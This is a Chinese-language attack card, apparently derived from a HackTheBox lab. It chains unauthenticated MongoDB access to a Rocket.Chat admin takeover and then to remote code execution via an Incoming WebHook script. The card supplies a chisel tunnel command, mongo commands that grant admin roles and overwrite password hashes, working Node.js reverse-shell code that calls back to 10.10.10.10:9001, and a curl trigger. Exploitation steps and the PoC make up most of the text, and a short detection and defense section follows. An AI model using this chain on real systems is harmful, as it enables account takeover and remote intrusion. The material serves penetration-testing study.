---
id: web-nodejs-rocketchat-mongodb-unauth-admin-webhook-rce
title: Rocket.Chat 内网 MongoDB 未授权改管理员 + Incoming WebHook 集成脚本 RCE：改 users 集合 roles/password 接管后台，再用 Node 脚本反弹 shell
type: scenario
domain: web
path: web/nodejs
technique: rocketchat-mongodb-unauth-admin-takeover-webhook-rce
aliases:
- Rocket.Chat MongoDB 未授权
- rocketchat_users 改管理员
- Incoming WebHook 集成 RCE
- Rocket.Chat webhook 反弹 shell
- Meteor users roles admin
- mongodb 27017 未授权接管
tags:
- rocketchat
- mongodb
- meteor
- nodejs
- unauthorized-access
- admin-takeover
- webhook
- rce
- lateral-movement
- container
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V630
  verified_at: '2026-11-12T23:42:39+08:00'
  notes: 已对照原文与61张图核对：图45-48确认 chisel R:27017:172.17.0.2:27017 隧道与未授权 mongo、meteor 库；图49-50确认 users 集合 administrator(_id ZLmid6a4h5YEosPQi) 改 roles:[admin] 并可用 bcrypt 哈希重置口令；图51-52管理后台 Info 版本 2.4.13；图54-56确认 Incoming WebHook Script Enabled 与 revshells.com node.js#2 脚本（截图 10.10.10.10:9001）；图58-61确认 curl /hooks/<id>/<token> 触发后 8002 收到 root shell，并用 CDK cap-dac-read-search 读 root.txt。卡片 curl URL 取自原文正文，截图58另一次触发为重新生成的 webhook token 且 success:false，不影响链路成立。Rocket.Chat 2.4.13 为目标版本非受影响区间，未设 affected_versions；无 CVE。dedup 候选（Mongo 注入/默认凭据/CF 等）非同链。未在本机复跑；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

Rocket.Chat 的用户与权限数据存放在 Meteor 的 MongoDB（默认库 `meteor`、集合 `users`）中；当内网 MongoDB 27017 未启用认证或仅绑定内网时，攻击者可直接 `db.users.update` 给任意用户加 `roles:["admin"]` 并写入已知 bcrypt 口令哈希，登录 Rocket.Chat 管理员后台；管理员可在 Integrations 创建 Incoming WebHook 并启用 Script，脚本以 Node.js 在服务端执行（可用 `require('child_process')`/`net`），访问 `/hooks/<id>/<token>` 触发即获得命令执行/反弹 shell，通常为该容器的服务账户权限。

## 原理

- **数据面即权限面**：Rocket.Chat 基于 Meteor，MongoDB 是唯一可信数据源，用户文档包含 `username`、`roles`、`services.password.bcrypt` 等字段；Mongo 未授权时代替了认证系统，直接改库就等于改身份。
- **接管管理员**：`use meteor; db.users.find()` 可看到 `administrator` 与 `Rocket.Cat` 等文档；`db.users.update({"_id": "<id>"}, {$set: {"roles": ["admin"]}})` 授予管理员角色；再把 `services.password.bcrypt` 改成攻击者已知明文对应的 bcrypt 哈希（或直接改已有管理员密码），即可用该口令登录 `/admin`。
- **为什么改库可行**：MongoDB 默认 27017 且很多内网部署未开 `--auth`/未绑定 `127.0.0.1`；攻击者从已控主机经 chisel/frp 反向隧道把内网 27017 映射到本地即可直连（`./chisel client <attacker>:8000 R:27017:<mongo_ip>:27017`）。
- **WebHook 集成即代码执行**：Rocket.Chat 管理员可创建 Incoming WebHook，并在集成设置中勾选 “Script Enabled”，脚本运行在 Node.js 服务端上下文，可直接 `require('child_process')` 创建进程、`require('net')` 反连；保存后页面给出 `/hooks/<token>` URL，任何能访问 3000 端口的人 `curl` 该 URL 即触发脚本。
- **为什么能反弹**：脚本里 `cp.spawn("sh",[])`、`net.Socket().connect(attacker,port)`，把 socket 与子进程 stdin/stdout/stderr 对接，和普通 Node 反弹 shell 等价；Rocket.Chat 进程（容器内）通常以 root 或高权账户运行，因此拿到的是该容器的 shell，可继续横向/读 flag。
- **前置**：Mongo 可达且无认证（或已知凭据）；Rocket.Chat 版本允许管理员创建 Incoming WebHook 并启用脚本（管理后台功能默认存在）；攻击者可访问 3000 端口触发 webhook。

## 触发条件

- 目标 Rocket.Chat 使用外部/同网 MongoDB，27017 对内网可达且未启用认证（或弱口令）。
- 攻击者已能访问该内网（例如已拿下同网容器/主机，可用 chisel 等建隧道）。
- Rocket.Chat 管理员后台可登录（改库后即可）。
- Incoming WebHook 集成与自定义脚本功能未被关闭，服务端 Node 进程有出站网络。

## 利用步骤

1. 在内网主机上发现 27017：`nmap -p 27017 <mongo_ip>`；用 chisel 建反向隧道：`./chisel client <attacker>:8000 R:27017:<mongo_ip>:27017`。
2. 本地 `mongo --port 27017` 直连（无需认证）：`show dbs` → `admin/config/local/meteor`；`use meteor`；`db.getCollectionNames()` 确认 `users`、`rocketchat_integrations` 等集合。
3. `db.users.find()` 找到 `administrator` 文档 `_id`；执行 `db.users.update({"_id": "<id>"}, {$set: {"roles": ["admin"], "services.password.bcrypt": "<已知明文对应 bcrypt>"}})`（或直接改已有管理员密码哈希）。
4. 用 administrator/已知口令登录 `http://target:3000`，进入 `/admin/integrations`。
5. `New Integration` → `Incoming WebHook` → 填名称/频道，`Script Enabled = True`，粘贴 Node 反弹脚本（`require('net')` + `child_process.spawn('sh')`，socket 对接 stdio）；保存。
6. 记下生成的 `/hooks/<id>/<token>`，攻击机 `nc -lnvp <port>`，`curl http://target:3000/hooks/<id>/<token>` 触发，获得 Rocket.Chat 容器 shell。
7. 在容器内收集凭据/挂载/网络信息，按需继续横向（如本例后续用 CDK `cap-dac-read-search` 读 root 文件）。

## PoC

```javascript
// Incoming WebHook 的 Script 字段（Node.js，反弹到 10.10.10.10:9001）
(function(){
  var net = require('net'), cp = require('child_process'), sh = cp.spawn('sh', []);
  var client = new net.Socket();
  client.connect(9001, '10.10.10.10', function(){
    client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
  });
  return /a/; // 防止 Node 应用崩溃
})();
```

```bash
# 触发
curl http://talkative.htb:3000/hooks/D8QhHe48uKenvbq8N/Czn627u78hEXsE3uxxwXL9xqJDmtToRYKdCxtsbTzchgJoRi
```

```javascript
// MongoDB 接管管理员（示意）
use meteor
db.users.find().forEach(printjson)
db.users.update({"_id": "<administrator_id>"}, {$set: {"roles": ["admin"], "services.password.bcrypt": "<bcrypt_hash>"}})
```

## 变体与关联

- 变体：Mongo 有认证但使用弱口令/默认口令时可先爆破或复用泄露凭据；`users` 集合字段名随 Rocket.Chat 版本可能为 `roles` 或 `service` 嵌套结构，先 `find()` 确认。
- 变体：Rocket.Chat 旧版本/插件可能存在其他服务端脚本执行点（Livechat、Outgoing WebHook、Slash Command），原理相同——管理员可控的 JS 在 Node 服务端执行。
- 关联：同类“内网未授权 MongoDB/Redis”横向见 [[pentest-initial-access-mongodb-hardcoded-default-credential-secret-read]]；内网隧道工具与端口转发可参考 chisel/frp 相关卡；容器内提权/读文件原语见 [[pentest-privilege-escalation-file-capabilities-abuse]]（CAP_DAC_READ_SEARCH 可读 root 文件）。
- 边界：Mongo 仅绑定 127.0.0.1 且容器间无横向路径、或 Rocket.Chat 禁用自定义集成脚本时，本链在第一步或最后一步失效；管理员后台若启用 2FA，改库后可能仍需绕过。

## 检测与防御

- **检测**：MongoDB 27017 的未授权连接与 `users` 集合异常更新（roles 增加 admin、password.bcrypt 变更）；Rocket.Chat 后台出现新建 Incoming WebHook、Script Enabled=true、脚本含 `require('child_process')`/`net.Socket`；3000 端口对 `/hooks/` 的异常请求与 Rocket.Chat 进程外连。
- **防御**：MongoDB 启用 `--auth`、绑定 `127.0.0.1`/内网 ACL、使用强口令；Rocket.Chat 与 Mongo 网络分段，禁止容器间任意访问 27017；限制管理员数量与 2FA；关闭不需要的 Incoming WebHook 脚本或限制可创建集成的角色；升级 Rocket.Chat 并审计集成配置。
